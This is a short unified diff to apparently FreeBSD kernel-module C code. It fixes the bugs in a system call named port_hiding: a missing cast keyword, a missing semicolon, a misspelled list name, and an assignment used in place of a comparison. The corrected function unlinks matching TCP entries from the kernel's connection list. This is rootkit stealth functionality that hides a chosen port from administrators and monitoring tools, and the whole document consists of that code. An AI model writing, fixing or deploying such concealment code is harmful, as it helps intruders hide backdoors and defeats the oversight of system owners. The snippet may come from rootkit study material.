@@ -23,19 +23,19 @@ static int
 port_hiding(struct thread *td, void *syscall_args)
 {
 	struct port_hiding_args *uap;
-	uap = (port_hiding_args *)syscall_args;
+	uap = (struct port_hiding_args *)syscall_args;
 
 	struct inpcb *inpb;
 
-	INP_INFO_WLOCK(&tcbinfo)
+	INP_INFO_WLOCK(&tcbinfo);
 
-	LIST_FOREACH(inpb, tcbino.ipi_listhead, inp_list) {
+	LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
 		if (inpb->inp_vflag & INP_TIMEWAIT)
 				continue;
 
 		INP_WLOCK(inpb);
 
-		if (uap->lport = ntohs(inpb->inp_inc.inc_ie.ie_lport))
+		if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
 				LIST_REMOVE(inpb, inp_list);
 
 		INP_WUNLOCK(inpb);
